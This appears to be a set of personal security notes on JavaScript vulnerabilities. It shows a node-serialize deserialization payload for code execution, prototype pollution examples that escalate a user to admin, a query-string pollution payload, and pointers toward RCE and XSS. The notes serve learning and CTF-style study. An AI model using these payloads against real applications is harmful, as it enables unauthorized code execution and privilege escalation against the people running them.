# Javascript vulns 

http://jsnice.org/ Deobfuscate JavaScript

## node-serialize

This old npm package from a long long time ago is vulnerable to deserialisation attacks (as most languages are) because internally, it uses eval. We have to use JavaScript's Immediately Invoked Function Expression (IIFE) to execute code.

If you can read the JSON directly, just use `return require(fs).readFileSync()`, else feel free to call a webhook or something.

Links:
- https://www.npmjs.com/package/node-serialize
- https://github.com/luin/serialize
- https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

```js
var serialize = require('node-serialize');
var x = '{"rce":"_$$ND_FUNC$$_function (){console.log(\'exploited\')}()"}'
var y = {"rce":"_$$ND_FUNC$$_function (){console.log(\'exploited\')}()"}
// both work, since for some reason unserialize accepts any
serialize.unserialize(x);
serialize.unserialize(y);
```

## Prototype pollution

Every object in Javascript inherits from the base Object prototype. 

By overwriting/adding an attribute to `__proto__`, all other objects will also magically gain this attribute. 

```js
> a={}; b={};
< undefined
> a.__proto__.key = "value"
< 'value'
> b.key
< 'value'
```

Since `b` does not have a key of `key`, it looks up the prototype chain and finds it in its prototype. If `b` had a key of `key` set, it would have returned that defined value instead.

### Example

```js
// initial scenario
users = {
  john: {
    userid : "John",
    pass : "password",
    personal_statement : {},
    permission : 'user'
  }
}
// exploit
users['john'].personal_statement.__proto__.permission = 'admin'
// users is also of the same prototype, so it inherits the permission attribute
// now we have a arbitary admin user
users['__proto__'].permission == 'admin'
```

```js
var ihaveaccesstothis = 'hello';

var attackme = {
	'admin': false,
};

console.log(attackme.admin); // false
console.log(attackme.__proto__); // Object
console.log(ihaveaccesstothis.__proto__); // String
console.log(ihaveaccesstothis.__proto__.__proto__); // Object !

ihaveaccesstothis.__proto__.__proto__.admin = True;

console.log(attackme.admin) // true
```

Caveat: If the object has nested inheritances (eg. I want to overwrite String.toLower()), overwriting the base Object prototype won't work. We need access to the String prototype.

### In query params

Prototype pollution can also occur client-side in query params. If the query string parser returns keys directly and not as strings, we can overwrite the object's attributes.

`?__proto__[admin]=1`

It's slightly weaker as we can only pass in strings.

### RCE

If we can pass in functions, simply target an attribute function that is being called (eg. String.valueOf() or smtg else) and overwrite it to something else.

### Other stuff

Every attribute of window is a global variable (and vice versa!) This means that asdf == window.asdf, window.name == name, window.location == location etc. If we are able to set these variables, we can possibly control these values to arbitrary stuff, enabling XSS etc.
